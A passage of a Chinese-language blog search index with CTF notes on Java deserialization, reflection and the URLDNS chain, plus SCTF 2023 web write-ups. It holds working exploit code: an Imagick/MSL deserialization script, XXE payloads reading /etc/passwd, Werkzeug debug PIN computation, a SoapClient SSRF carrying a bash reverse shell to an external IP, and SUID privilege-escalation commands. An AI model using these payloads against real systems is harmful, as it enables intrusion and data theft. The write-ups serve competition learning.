BlackCat black = (BlackCat) ois.readObject();\n        ois.close();\n        System.out.println(black);\n    &#125;\n&#125;\n\n\n\n\n如果要序列化的对象的父类 Animal 没有实现序列化接口，那么在反序列化时是会调用对应的无参构造方法的这样做的目的是重新初始化父类的属性,此时color的值为null\n\n\n\ntransient 标识的对象成员变量不参与序列化\n\n\n这里我在 Blackcat的name前加了transient，他就不会被序列化\n\n\n\n重写writeObject、readObject方法\n\n\n现在有一个新的需求，对于一个 数组如果开辟了100个空间，但是只存了30个元素，这种显然不能把所有的都序列化，因此可以自定义序列化过程\n\n这里如果我在类中重写了这两个方法，那就会调用我重写的这个\n\n\nimport java.io.Serializable;\n\npublic class BlackCat extends Animal implements Serializable &#123;\n    private static final long serialVersionUID = 1L;\n    private String name;\n\n    public BlackCat() &#123;\n        super();\n        System.out.println(\"调用黑猫的无参构造\");\n    &#125;\n\n    public BlackCat(String color, String name) &#123;\n        super(color);\n        this.name = name;\n        System.out.println(\"调用黑猫有 color 参数的构造\");\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return \"BlackCat&#123;\" +\n                \"name='\" + name + '\\'' +super.toString() +'\\'' +\n                '&#125;';\n    &#125;\n\n\tprivate void writeObject(java.io.ObjectOutputStream s)\n            throws java.io.IOException &#123;\n        //执行 JVM 默认的序列化操作\n        s.defaultWriteObject();\n \n \n        //手动序列化 arr  前面30个元素\n        for (int i = 0; i &lt; 30; i++) &#123;\n            s.writeObject(arr[i]);\n        &#125;\n    &#125;\n \n    /**\n     * Reconstitute the &lt;tt>ArrayList&lt;/tt> instance from a stream (that is,\n     * deserialize it).\n     */\n    private void readObject(java.io.ObjectInputStream s)\n            throws java.io.IOException, ClassNotFoundException &#123;\n \n        s.defaultReadObject();\n        arr = new Object[30];\n \n        // Read in all elements in the proper order.\n        for (int i = 0; i &lt; 30; i++) &#123;\n            arr[i] = s.readObject();\n        &#125;\n    &#125;\n\n&#125;\n\n\n\n\n\n也就是 只要反序列化，服务器就回运行readObject方法，不管我写啥它都执行\n\njava反射\n反射就是通过Class，变回原来的\n\n\nClick to see more\nimport java.io.Serializable;\n\npublic class BlackCat implements Serializable &#123;\n    private static final long serialVersionUID = 1L;\n    public String name;\n    private String color;\n\n    public BlackCat() &#123;\n        super();\n        System.out.println(\"调用黑猫的无参构造\");\n    &#125;\n\n    public BlackCat(String color, String name) &#123;\n        this.color = color;\n        this.name = name;\n        System.out.println(\"调用黑猫有 color 参数的构造\");\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return \"BlackCat&#123;\" +\n                \"name='\" + name + '\\'' + \"color =\"+ color + '\\'' +\n                '&#125;';\n    &#125;\n&#125;\n\n\n\n\nBlackCat blackCat = new BlackCat();\nClass c = blackCat.getClass();\n\n\n这里面的Class相当于所有class的原型类\n\n获取constructor c.newInstance();//这里会调用无参构造器\nConstructor constructor = c.getConstructor(String.class, String.class);\nObject cat = constructor.newInstance(\"aa\", \"bb\");\nSystem.out.println(cat);\n\n\n获取fieldsField[] fields = c.getFields();\n\n\n修改属性\n\nConstructor constructor = c.getConstructor(String.class, String.class);\n//这里传参数表示指定使用哪个构造器\nObject cat = constructor.newInstance(\"aa\", \"bb\");\nField color = c.getDeclaredField(\"name\");\ncolor.set(cat,\"ccccccc\");\nSystem.out.println(cat);\n\n\n\n可以看到改值成功了\n\n修改Private属性Field color = c.getDeclaredField(\"color\");\ncolor.setAccessible(true);\ncolor.set(cat,\"blackyellow\");\nSystem.out.println(cat);\n\n\ncolor.setAccessible(true);这样才可以访问private属性\n\n修改属性\nMethod hello = c.getMethod(\"hello\", String.class);\nhello.invoke(cat, \"aaaaaaaaa\");\n\n\n也就是这里指明你要改的是cat这个类，并传递后面的参数\n\nLazyList.scala\nprivate object State &#123;\n  @SerialVersionUID(3L)\n  object Empty extends State[Nothing] &#123;\n    def head: Nothing = throw new NoSuchElementException(\"head of empty lazy list\")\n    def tail: LazyList[Nothing] = throw new UnsupportedOperationException(\"tail of empty lazy list\")\n  &#125;\n\n  @SerialVersionUID(3L)\n  final class Cons[A](val head: A, val tail: LazyList[A]) extends State[A]\n&#125;\n\n\n\nClass clazz = Class.forName(className);\nField field = clazz.getDeclaredField(fieldName);\n\n\n前面的是color，这里应该是为了可以直接访问Object Empty的方法和属性，也就是head 和 tail\nURLDNS链原理\n首先要找一个入口，肯定要实现Serialible\n\n\t\n\n\nentry就是每个key-value的键值对\nHashMap&lt;URL, Integer> urlIntegerHashMap = new HashMap&lt;>();\nurlIntegerHashMap.put(new URL(\"http://xn4tle.dnslog.cn\"),1);\n//这里的逻辑是，  hashmap在put\nObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"1.txt\"));\noos.writeObject(urlIntegerHashMap);\noos.flush();\noos.close();\n\n\n这里的逻辑是，  hashmap在put时会调用putVal方法\n\n\n\n\n\n然后会调用hashCode，这里可以理解成toString()，也就是在方法可以重写hashCode,就会调用自己的\n\n\n\n\n\n\n\n\n提示\nnative关键字表示该方法的实现是依赖于特定的操作系统和硬件平台，并且与Java语言规范无关\n\n\n\n对于URL类来说，他自己重写了 hashCode\n\n\n\n进一步的，会调用getHostAddress，也就是\n\n\n\n\n这里也就会发起请求，因此hashmap在put时会发起请求，这里可以通过Dnslog看到\n\n\n\n构造链\n现在我需要在反序列化时让它发起dns请求，hashcode的默认值是-1，现在需要在序列化前，让hashcode!=-1\n\n\n- \n","slug":"java反序列化","date":"2023-08-07T02:18:56.000Z","categories_index":"","tags_index":"java","author_index":"XyM4ster"},{"id":"495070cda26bf6060daf4768027efb5d","title":"fuzz","content":"","slug":"fuzz","date":"2023-08-06T08:25:10.000Z","categories_index":"","tags_index":"","author_index":"XyM4ster"},{"id":"df0d3403c0b3873dd87fee8ad4e5e9ae","title":"CTF_web_wp","content":"\n  \n  \n    \n      \n      \n        Hey, password is required here.\n      \n    \n  \n\n","slug":"CTF-web-wp","date":"2023-08-01T09:22:05.000Z","categories_index":"","tags_index":"CTF,web","author_index":"XyM4ster"},{"id":"4c90b088c95eb83a9985c879c9096e11","title":"hexo_config","content":"hexo 图片配置头像配置\n不知道为什么，hexo无法访问图床图片\n\n在设置头像时，创建source/images/picture.jpg ，在该文件夹下放图片\n\n运行时，可以用localhost:4000/images/picture.jpg访问到\n\n在_config.aurora.yml中配置头像地址\navatar: /images/picture.jpg\n\n","slug":"hexo-config","date":"2023-08-01T01:58:58.000Z","categories_index":"","tags_index":"hexo","author_index":"XyM4ster"},{"id":"78573adfdee442ddc082a9ef8f1c1600","title":"SCTF","content":"SCTF ezcheck1n思路\nhint提示：find the way to flag.Looks like there are two containers with an evil P in the configuration file of the frontend server\n前端服务器的配置文件中有 two containers with an evil P\n\nBoogipop师傅的wpCVE-2023-25690 Apache HTTP Server 请求走私漏洞 分析与利用 - 先知社区反向代理是一种代理模式，它充当Web服务器网关的代理服务器。当您将请求发送到使用反向代理的Web服务器时，他们将先转到反向代理，由该代理将确定是将其路由到哪个内部服务器。\n\n\n将以 &#x2F;hello&#x2F; 开头的 URL 请求转发到 http://10.122.255.252/index.php 地址，并把hello之后的内容作为参数，作为name的值\n\nSCTF fumo_backdoor思路\n\nsleep函数： 如果路径存在文件，且路径不包括flag，会readfile\n\n\nDockerfile 是用于构建 Docker 镜像的文本文件，其中包含了一系列指令和参数，用于描述如何构建镜像。\nDockerfile 中的指令可以用于定义所需的基础镜像、安装依赖、添加文件、执行命令等操作，最终生成一个可运行的 Docker 镜像。\n\n\n这里注意到安装了imagick扩展，于是就上Github上搜，但是我并没有搜到\n\nhttps://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md\n\n当对象被序列化时，会触发sleep，当对象反序列化时，会触发wake up\nsleep方法会读flag，但是这里有正则匹配，所以要把flag换个目录\nwakeip方法中可以执行无参的命令\n\n问题1：如何触发sleep\n\n当前情况下，只有**session**可以序列化\n\n也就是如果我往session里写了东西，改了session，web框架检测到**session**修改，就会触发session的序列化，让他重新保存。\n当你使用 PHP 中的 session 时，如果你往 session 中写入了数据，PHP 会将这些数据序列化为字符串，并将其存储在服务器上的某个位置（通常是文件系统上的某个位置，但也可以是其他位置，例如数据库中）。当客户端请求该 session 时，PHP 会将存储的字符串反序列化为原始数据\n问题2：那怎么改session呢？\n\n参考上面的github，也就是我进到wakeup里面去，让他new Imagick(&quot;vid:msl:/tmp/php*&quot;)，现在可以执行msl脚本了\n\n\n问题3：我怎么传一个**msl**脚本？\n\n直接上传一个文件，在末尾添加脏数据，php会把上传的文件保存在/tmp/phpxxxx目录下\n用户的session保存在/tmp目录下，以sess_(这部分是用户名)\n\n\n\n 标签用于读取一个文件，它的 filename 属性指定了要读取的文件的路径和名称。在这个示例中，这个文件是一个 BASE64 编码的图片文件，它的数据被嵌入在一个 data URI 中，通过 inline: 协议来指定。\n 标签用于将处理后的图像写入到一个文件中，它的 filename 属性指定了要写入的文件的路径和名称。在这个示例中，这个文件的路径为 &#x2F;tmp&#x2F;sess_RABBIT。\n从这个 MSL 脚本来看，它的目的是读取一个图片文件，进行一些图像处理操作，然后将处理后的图片保存到/tmp/sess_afkl中\n\n问题4：现在已经跑到sleep中了，但是不能直接读flag，咋办？\n\n再执行一次new imagick，把flag换个地方\n\n\n\n这里需要让flag通过图片校验，所以去找一个检查宽松的格式\n\nhttps://github.com/ImageMagick/ImageMagick/blob/main/www/formats.html  \n\n此时我把flag读到了/tmp/2333hhhh目录下\n反序列化执行wakeup，用我的cookiePHPSESSID=afkl去读flag\n\npy脚本注意这里上传文件的格式\n\n和之前学的一样，value中包括两个元组，第一个是文件名，第二个是内容\n最后携带自己的cookiePHPSESSID去访问网站\n\ncookies=&#123;&quot;PHPSESSID&quot;: session_id&#125;)\n\nClick to see more\nimport requests, base64, time\nSERVER_ADDR = \"http://182.92.6.230:18080/\"\ndef del_tempd():\n    resp = requests.post(SERVER_ADDR, data=&#123;\"cmd\":\"rm\"&#125;)\n    print(resp.status_code)\n\ndef write_file(xml: str):\n# Imagick(\"vid:msl:/tmp/php*\")\n    unserialize = base64.b64decode(b'TzoxMzoiZnVtb19iYWNrZG9vciI6NDp7czo0OiJwYXRoIjtOO3M6NDoiYXJndiI7YToxOntpOjA7czoxNzoidmlkOm1zbDovdG1wL3BocCoiO31zOjQ6ImZ1bmMiO047czo1OiJjbGFzcyI7czo3OiJJbWFnaWNrIjt9')\n    print(unserialize)\n    resp = requests.post(SERVER_ADDR,files=&#123;\"file\":(\"exec1.msl\",xml)&#125;,data=\n    &#123;\"cmd\":\"unserialze\",\"data\":unserialize&#125;)\n    print(resp.status_code)\n    \ndef show_phpinfo() -> None:\n    print(SERVER_ADDR + \"?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A14%3A%22vid%3Amsl%3A%2Ftmp%2Fa%22%3Bs%3A4%3A%22func%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D\")\n\ndef get_new_php_session() -> str:\n    resp = requests.get(SERVER_ADDR + \"?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A14%3A%22vid%3Amsl%3A%2Ftmp%2Fa%22%3Bs%3A4%3A%22func%22%3Bs%3A13%3A%22session_start%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D\")\n    return resp.headers.get(\"Set-Cookie\")[10:42]\n\n\ndef session_start(session_id: str):\n    resp = requests.get(SERVER_ADDR + \"?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A2%3A%7Bs%3A4%3A%22path%22%3Bs%3A8%3A%22%2Ftmp%2Fyyz%22%3Bs%3A4%3A%22func%22%3Bs%3A13%3A%22session_start%22%3B%7D\", cookies=&#123;\"PHPSESSID\": session_id&#125;)\n    print(resp.text)\n\ndel_tempd()\ntime.sleep(2)\n\nsession_id = get_new_php_session()\nprint(session_id)\ntime.sleep(2)\n\ndel_tempd()\ntime.sleep(2)\n\nxml = f'''&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;group>\n&lt;image >\n &lt;read filename=\"mvg:/flag[20x20+20+20]\"!(\n!)image>\n&lt;write filename=\"mvg:/tmp/yyz\"!(\n!)group>\n'''\nxml2 = f'''&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;group>\n&lt;image >\n&lt;read\nfilename=\"inline:data:text/8BIM;base64,eXl6fE86MTM6ImZ1bW9fYmFja2Rvb3IiOjI6e3M6NDoicGF0a\nCI7czo4OiIvdG1wL3l5eiI7czo0OiJmdW5jIjtzOjEzOiJzZXNzaW9uX3N0YXJ0Ijt9\"!(\n!)image>\n&lt;write filename=\"8BIM:/tmp/sess_&#123;session_id&#125;\"!(\n!)group>\n'''\n\nwrite_file(xml)\ntime.sleep(3)\n\nwrite_file(xml2)\ntime.sleep(3)\n\nsession_start(session_id)\n\n\n\nSCTF pypyp?\n首先提示，session not started，也就是需要开启session\n\nsession.upload_progress开启session文件包含骚姿势——利用session.upload_progress进行文件包含_noViC4的博客-CSDN博客\n&lt;?php\n// 检查文件是否上传成功\nif ($_FILES['file']['error'] > 0) &#123;\n\techo '文件上传失败：' . $_FILES['file']['error'];\n\texit;\n&#125;\n\necho \"aaaa\";\n\n?>\n\n&lt;html>\n&lt;body>\n&lt;form action=\"http://192.168.1.101/a.php\" method=\"POST\" enctype=\"multipart/form-data\">\n    &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"1\" />\n    &lt;input type=\"file\" name=\"file\" />\n    &lt;input type=\"submit\" value=\"submit\" />\n&lt;/form>\n&lt;/body>\n&lt;/html>\n\n\n\n\n也就是我上传一个PHP_SESSION_UPLOAD_PROGRESS，同时带一个Cookie，就会让服务器开启session_start，创建一个session\n\n\n\n这长度竟然不一样，前面是----,后面是------\n\n\n\n会认为后面这个是post上传的数据，key是data\n在 HTTP 请求的消息体中，如果使用了 multipart&#x2F;form-data 格式，那么消息体中的每个部分都会使用 Content-Disposition 头来指定该部分的类型。如果部分是表单字段，那么 Content-Disposition 头的值通常为 form-data，并且会包含一个 name 属性来指定字段的名称。在这个例子中，Content-Disposition 头的值为 form-data; name&#x3D;”data”，其中 name&#x3D;”data” 表示这是一个名为 data 的表单字段。在 PHP 中，您可以通过访问 $_POST[‘data’] 来获取该字段的值。\n\n\nphp源码审计\nClick to see more\n&lt;?php\n    error_reporting(0);\n    if(!isset($_SESSION))&#123;\n        die('Session not started');\n    &#125;\n    highlight_file(__FILE__);\n    $type = $_SESSION['type'];\n    $properties = $_SESSION['properties'];\n    echo urlencode($_POST['data']);\n\n    extract(unserialize($_POST['data']));\n\n    if(is_string($properties)&amp;&amp;unserialize(urldecode($properties)))&#123;\n    $object = unserialize(urldecode($properties));\n    $object -> sctf();\n    exit();\n    &#125; else if(is_array($properties))&#123;\n        $object = new $type($properties[0],$properties[1]);\n    &#125; else &#123;\n        $object = file_get_contents('http://127.0.0.1:5000/'.$properties);\n    &#125;\n    echo \"this is the object: $object &lt;br>\";\n\n?>\n\n\n\n\n这里首先extract可以控制变量，$type和$properties都可以控制\n\nextract除了可以提取上传的参数，比如?properties&#x3D;aa，变成$properties&#x3D;aa\n\n也可以提取数组，array(“properties” &#x3D;&gt; “aa”,”type” &#x3D;&gt; “bb”)，这个也会变成$properties&#x3D;aa，$type&#x3D;bb\n\n$object -&gt; sctf()，但是这里显然是没有这个函数，因此可以想用soapclient进行ssrf\n\nfile_get_contents(‘http://127.0.0.1:5000/'.$properties))这个可以获取文件内容\n\n\n\n首先题目提示查看/app/app.py,那就需要想办法查看源码。\n\nnew $type($properties[0],$properties[1])，这个参数可以自己控制\nnew $type($properties[0],$properties[1])SimpleXMLElement：它可以实现xxe,xxe中用file协议读取文件，获得app.py的源码SplFileObject：支持伪协议读取文件，也就是可以用php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;app&#x2F;app.py，或者file协议读取文件\nSimpleXMLElement\n\n用php的内置类SimpleXMLElement\n\n&lt;?php\n\n$xml = &lt;&lt;&lt;EOD\n&lt;?xml version = \"1.0\"?>\n&lt;!DOCTYPE ANY [\n&lt;!ENTITY f SYSTEM \"file:///etc/passwd\">\n]>\n&lt;x>&amp;f;&lt;/x> \nEOD;\n//echo $xml;\n$arr=Array(\"properties\"=>Array($xml,2),\"type\"=>\"SimpleXMLElement\");\necho (serialize($arr));\n$obj=new SimpleXMLElement($xml,2);\n//echo $obj;\n?>\n\n\n&lt;&lt;&lt;EOD是多行字符串的意思，可以理解成python 中的&#96;&#96;&#96;&#96;&#96;\n这个2可以理解成固定的，如果输出$obj，就会运行上面的xml代码，也就是会读出etc/passwd的内容\n\n\nSplFileObject\n\n\n第一个参数可以是伪协议，第二个参数是r\n\n&lt;?php\n\n//echo $xml;\n$x = \"php://filter/read=convert.base64-encode/resource=/app/app.py\";\n$arr=Array(\"properties\"=>Array($x,'r'),\"type\"=>\"SplFileObject\");\necho (serialize($arr));\n#\n\n\n\n解码后得到源码\n\nfrom flask import Flask\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return 'Hello World!'\n\nif __name__ == '__main__':\n    app.run(host=\"0.0.0.0\",debug=True)\n\n\nflask开启了debug–&gt;pin码rce\n正常在本地运行一下环境，之后访问/console，输入正确的Pin码后，可以进入console，执行命令\n那如果我可以控制服务器的console，也就可以rce了\n首先用file_get_contents访问一下console\n\n\n\n本地测试\n\n\n发现访问时候的参数如下，因为我没法输入命令(都是在burp render看的回显)，所以我只能带着参数去访问\n\n\n\n发现是有cookie的\n\n那如何带着参数去访问呢？\n\n那就只能用**SoapClient**，因为上面有一个object-&gt;sctf，也就是会调用soapclient的call方法，也就是可以携带参数访问了\n\n\nflask算pin码\n\n\n网上有很多教程，首先我需要确定的是python的版本\n因为它没有报错，所以我不知道路径，只能看运气\n用GlobIterrator类配合glob伪协议去找每个可能一点的目录\nV&amp;N的wp中说用php的GlobIterrator类配合glob伪协议去找每个可能一点的目录，这个目前我还没实现\n我本地的目录是，算pin码的方法在__init__.py中\n\n\n\n这里就百度找吧，因为前一天我做了一个ctfshow的flask算pin码的，大致差不多\n也有的wp说访问/usr/lib/python3.8/LICENSE.txt，如果它存在，说明是python3.8\n最后__init__.py的位置在\n\n/usr/lib/python3.8/site-packages/werkzeug/debug/init.py\n算pin码的脚本\n\n直接翻源码\n\n\nClick to see more\nimport getpass\nimport hashlib\nimport json\nimport mimetypes\nimport os\nimport pkgutil\nimport re\nimport sys\nimport time\nimport typing as t\nimport uuid\nfrom itertools import chain\nfrom os.path import basename\nfrom os.path import join\ndef hash_pin(pin: str) -> str:\n    return hashlib.sha1(f\"&#123;pin&#125; added salt\".encode(\"utf-8\", \"replace\")).hexdigest()[:12]\ndef get_pin_and_cookie_name() :\n \n    rv = None\n    num = None\n    probably_public_bits = [\n        'app',\n        'flask.app',\n        'Flask',\n        '/usr/lib/python3.8/site-packages/flask/app.py'\n    ]\n\n    private_bits = [\n        '2485378023426', #  /sys/class/net/eth0/address 16进制转10进制\n        #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup\n        '349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687'\n    ]\n\n\n    h = hashlib.sha1()\n    for bit in chain(probably_public_bits, private_bits):#使用 chain 函数可以方便地将多个可迭代对象合并成一个迭代器\n        if not bit:                                        #遍历其中的所有元素\n            continue\n        if isinstance(bit, str):#判断它是否为字符串类型\n            bit = bit.encode(\"utf-8\")\n        h.update(bit)\n    h.update(b\"cookiesalt\")\n\n    cookie_name = f\"__wzd&#123;h.hexdigest()[:20]&#125;\"\n\n    # If we need to generate a pin we salt it a bit more so that we don't\n    # end up with the same value and generate out 9 digits\n    if num is None:\n        h.update(b\"pinsalt\")\n        num = f\"&#123;int(h.hexdigest(), 16):09d&#125;\"[:9]\n\n    # Format the pincode in groups of digits for easier remembering if\n    # we don't have a result yet.\n    if rv is None:\n        for group_size in 5, 4, 3:\n            if len(num) % group_size == 0:\n                rv = \"-\".join(\n                    num[x : x + group_size].rjust(group_size, \"0\")\n                    for x in range(0, len(num), group_size)\n                )\n                break\n        else:\n            rv = num\n\n    cookie_value = f\"&#123;int(time.time())&#125;|&#123;hash_pin(rv)&#125;\",\n    print(cookie_value)\nget_pin_and_cookie_name() \n\n\n\n\n\n最后这个路径是/usr/lib/python3.8/site-packages/flask/app.py，我在本地输出的是下面这个，也就是找到前半部分，后面直接对应就行了\n\n\n\n通过xxe查看信息\n\n\n\n查看 /sys/class/net/eth0/address，用下面的代码转成10进制\n\n\nint('0242ac130002',16)#2485378023426\n\n\n下面是获取machine_id的源码，通常\n\n\n\ndocker没有第一个，只需要把后两个合起来就行了\n\nproc/sys/kernel/random/boot_id /proc/self/cgroup\n\n根据上面的代码，用/分开，且要最后一部分\n\n\n\n最后计算pin的脚本，cookie_value的算法参见__int__.py源码\n\n\nClick to see more\ndef hash_pin(pin: str) -> str:\n    return hashlib.sha1(f\"&#123;pin&#125; added salt\".encode(\"utf-8\", \"replace\")).hexdigest()[:12]\ndef get_pin_and_cookie_name() :\n \n    rv = None\n    num = None\n    probably_public_bits = [\n        'app',\n        'flask.app',\n        'Flask',\n        '/usr/lib/python3.8/site-packages/flask/app.py'\n    ]\n\n    private_bits = [\n        '2485378023426', #  /sys/class/net/eth0/address 16进制转10进制\n        #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup\n        '349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687'\n    ]\n\n\n    h = hashlib.sha1()\n    for bit in chain(probably_public_bits, private_bits):#使用 chain 函数可以方便地将多个可迭代对象合并成一个迭代器\n        if not bit:                                        #遍历其中的所有元素\n            continue\n        if isinstance(bit, str):#判断它是否为字符串类型\n            bit = bit.encode(\"utf-8\")\n        h.update(bit)\n    h.update(b\"cookiesalt\")\n\n    cookie_name = f\"__wzd&#123;h.hexdigest()[:20]&#125;\"\n\n    # If we need to generate a pin we salt it a bit more so that we don't\n    # end up with the same value and generate out 9 digits\n    if num is None:\n        h.update(b\"pinsalt\")\n        num = f\"&#123;int(h.hexdigest(), 16):09d&#125;\"[:9]\n\n    # Format the pincode in groups of digits for easier remembering if\n    # we don't have a result yet.\n    if rv is None:\n        for group_size in 5, 4, 3:\n            if len(num) % group_size == 0:\n                rv = \"-\".join(\n                    num[x : x + group_size].rjust(group_size, \"0\")\n                    for x in range(0, len(num), group_size)\n                )\n                break\n        else:\n            rv = num\n\n    cookie_value = f\"&#123;int(time.time())&#125;|&#123;hash_pin(rv)&#125;\",\n    print(cookie_value)\nget_pin_and_cookie_name() \n\n\n\nsoapclient发包，反弹shell\n这里注意cmd中的参数要url编码，否则会有问题\nvps上开 nc -lvnp 7777,这里如果没有参数n，也会有问题\n\n$target = 'http://127.0.0.1:5000/console?&amp;__debugger__=yes&amp;cmd=__import__(%22os%22).popen(%22bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F124.222.155.242%2F7777%20%3C%262%5C%22%22)&amp;frm=0&amp;s=DhOJxtvMXCtezvKtqaK9';\n$ua =\"xym4ster\\r\\nX-Forwarded-For: 127.0.0.1\\r\\nCookie: __wzdb2a60e2b19822632a67c=1688531875|11b8517fb9fb\";\n$b = new SoapClient(null,array(\n    'location' => $target,\n    'user_agent'=>$ua,\n    'uri'=> \"aaab\"));\n$arr=Array(\"properties\"=>urlencode(serialize($b)),\"type\"=>\"SimpleXMLElement\");\n$aaa = serialize($arr);\necho $aaa;\n\n\n\n\n反弹成功，但是查看flag，发现没有权限，需要提权\n\n\n关于反弹shell\n\n上面的命令是\n\nbash -c \\\"bash -i >&amp; /dev/tcp/124.222.155.242/7777 &lt;&amp;2\\\"\n\n\n-c 选项表示将后面的参数作为一个命令来执行\n-i相当于会启动一个交互式的bash shell\n所以要先bash -c 再bash -i\n\n命令的含义Linux 反弹shell（二）反弹shell的本质 - 先知社区\n\n\n\n\n\n\n\n\n\n\n&amp;表示把标准输出和标准错误输出 都输出到vps上，也就是1和2 都指向vps\n\n后面的 &lt;&amp;2 相当于 0&lt;&amp;2，表示把标准输入指针到标准错误输出，也就是0也指向2，0指向1也行\n\n\n\n\n\n首先\n\nsuid 提权 curl权限提升 | suid提权及修复方式-腾讯云开发者社区-腾讯云\n通常Linux系统文件及目录最常见的三种权限为：可读权限(r)，可写权限(w)和可执行权限(x)。有时我们会发现有些文件或者目录的所属主的权限会带s标识。当s这个标志出现在文件所有者的x权限上时，如&#x2F;usr&#x2F;bin&#x2F;passwd文件的权限状态：“-rwsr-xr-x.”，此时就被称为Set UID，简称为SUID权限。当一个可执行文件被设置了 s 权限时，在执行该程序时，它将会以该程序的所有者或所属组的身份运行。\n\n也就是如果我找到了一个有SUID权限且属主为root的，我就能用root的权限执行\n\nfind / -user root -perm -4000 -print 2>/dev/null\nfind / -perm -u=s -type f 2>/dev/null\nfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;\n\n-perm 表示搜索随后的权限\n-u=s 表示查找root用户拥有的文件\n-type表示我们正在寻找的文件类型\nf 表示常规文件，而不是目录或特殊文件\n2 表示该进程的第二个文件描述符，即stderr（标准错误）\n> 表示重定向\n/dev/null 是一个特殊的文件系统对象，它将丢弃写入其中的所有内容\n\n\n\n发现有curl，直接curl file:///flag\n\n\nSCTF hellojavajava8、java11环境配置JDK 8 和JDK11双环境配置_别卷了球球了的博客-CSDN博客\n\n先安装jdk11，再安装jdk8(但是我觉得这个顺序不重要，只要把下面的文件删了就行)\n\n\n\n要把这个文件夹里面存在的文件都删掉(java.exe)啥的，不让cmd打开的优先级比我自己设置的优先级高\n配置环境变量\n\n\n\n把D:\\jdk-11\\bin目录下的java.exe改成java11.exe\n此时输入java -version，系统默认是jdk1.8，输入java11 -version是java11\n\n\njar包反编译\n给个jar包，用idea的插件java decompiler反编译\n在jar包所在的文件夹，打开cmd\n\njava -cp \"D:\\idea\\IntelliJ IDEA 2021.1.3\\plugins\\java-decompiler\\lib\\java-decompiler.jar\" org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true sctf.jar test\n\n\n中间双引号的是插件路径(换成自己的)，true后面第一个参数是jar包的名字,第二个参数是反编译后文件存放的位置，这里要新建一个test文件夹\n反编译成功之后，还是一个jar包，用jar命令解压\n\njar -xvf sctf.jar\n\n\n\n函数的作用是循环处理键\n\n整个代码的含义\nClick to see more\nprotected Object _deserializeUsingPropertyBased(final JsonParser p, final DeserializationContext ctxt)\n       throws IOException\n   &#123;\n       final PropertyBasedCreator creator = _propertyBasedCreator;\n    //这里获取标注@JsonCreator的构造函数\n       PropertyValueBuffer buffer = creator.startBuilding(p, ctxt, _objectIdReader);\n       TokenBuffer unknown = null;\n       final Class&lt;?> activeView = _needViewProcesing ? ctxt.getActiveView() : null;\n\n       JsonToken t = p.currentToken();\n    //currentToken() 方法的作用是返回当前解析器所读取的 JSON 标记\n       List&lt;BeanReferring> referrings = null;\n       for (; t == JsonToken.FIELD_NAME; t = p.nextToken()) &#123;\n           String propName = p.currentName();\n           p.nextToken(); // to point to value\n           final SettableBeanProperty creatorProp = creator.findCreatorProperty(propName);\n           /* \n           反序列化 JSON 字符串时，\n           Jackson 会使用 SettableBeanProperty 对象来访问和设置 Java 对象的属性\n           这行代码用于查找 PropertyBasedCreator 对象中是否存在与当前 JSON 字段名字 propName \n           匹配的 SettableBeanProperty 属性\n           也就是找类中有没有映射的属性\n           */\n           if (buffer.readIdProperty(propName) &amp;&amp; creatorProp == null) &#123;\n               continue;\n           &#125;\n           // creator property?\n           if (creatorProp != null) &#123;\n               // Last creator property to set?\n               Object value;\n               if ((activeView != null) &amp;&amp; !creatorProp.visibleInView(activeView)) &#123;\n                   p.skipChildren();\n                   continue;\n               &#125;\n               value = _deserializeWithErrorWrapping(p, ctxt, creatorProp);\n               //对属性值反序列化\n               if (buffer.assignParameter(creatorProp, value)) &#123;\n                   p.nextToken(); // to move to following FIELD_NAME/END_OBJECT\n                   Object bean;\n                   try &#123;\n                       bean = creator.build(ctxt, buffer);\n                   &#125; catch (Exception e) &#123;\n                       bean = wrapInstantiationProblem(e, ctxt);\n                   &#125;\n                   if (bean == null) &#123;\n                       return ctxt.handleInstantiationProblem(handledType(), null,\n                               _creatorReturnedNullException());\n                   &#125;\n                   // [databind#631]: Assign current value, to be accessible by custom serializers\n                   p.setCurrentValue(bean);\n\n                   //  polymorphic?\n                   if (bean.getClass() != _beanType.getRawClass()) &#123;\n                       return handlePolymorphic(p, ctxt, bean, unknown);\n                   &#125;\n                   if (unknown != null) &#123; // nope, just extra unknown stuff...\n                       bean = handleUnknownProperties(ctxt, bean, unknown);\n                   &#125;\n                   // or just clean?\n                   return deserialize(p, ctxt, bean);\n               &#125;\n               continue;\n           &#125;\n           // regular property? needs buffering\n           SettableBeanProperty prop = _beanProperties.find(propName);\n           if (prop != null) &#123;\n               try &#123;\n                   buffer.bufferProperty(prop, _deserializeWithErrorWrapping(p, ctxt, prop));\n               &#125; catch (UnresolvedForwardReference reference) &#123;\n                   // 14-Jun-2016, tatu: As per [databind#1261], looks like we need additional\n                   //    handling of forward references here. Not exactly sure why existing\n                   //    facilities did not cover, but this does appear to solve the problem\n                   BeanReferring referring = 